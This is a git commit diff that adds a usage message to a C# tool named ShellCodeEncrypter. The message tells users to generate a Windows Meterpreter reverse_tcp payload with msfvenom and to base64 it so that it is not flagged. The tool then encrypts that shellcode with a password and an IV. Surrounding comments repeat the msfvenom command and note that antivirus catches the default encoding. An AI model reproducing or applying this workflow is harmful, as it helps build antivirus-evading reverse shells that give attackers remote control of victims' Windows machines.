5143f7376d6bde357402b4975dca3b8207a1407c
sbridgens <simon.bridgens@gmail.com>
2022-01-08 14:27:04 +0000

    Updated usage

--- ShellCodeEncrypter/ShellCodeEncrypter/Program.cs
+++ ShellCodeEncrypter/ShellCodeEncrypter/Program.cs
@@ -10,6 +10,16 @@ namespace ShellCodeEncrypter
     {
         static void Main(string[] args)
         {
+            if(args.Length <= 0)
+            {
+                Console.WriteLine($"USAGE:\r\n" +
+                    $"From Kali generate and b64 the payload 'Dont use the Msfvenom b64 output it gets flagged'!\r\n" +
+                    $"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8080 -f hex|base64 -w0\r\n" +
+                    $"Use any method to generate a iv as a base64 string that will become a bytebag during the process\r\n\r\n" +
+                    $"Use this to generate encrypted and encoded shellcode using a password an iv:\r\n\r\n" +
+                    $".\\ShellCodeEncrypter.exe \"somepassword123\" base64IV base64Shellcode");
+                return;
+            }
             //Generate shellcode as b64:
             //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8080 -f hex|base64
             //oddly enough using the base64 format from meterpreter gets caught by my av when generating payload ;)
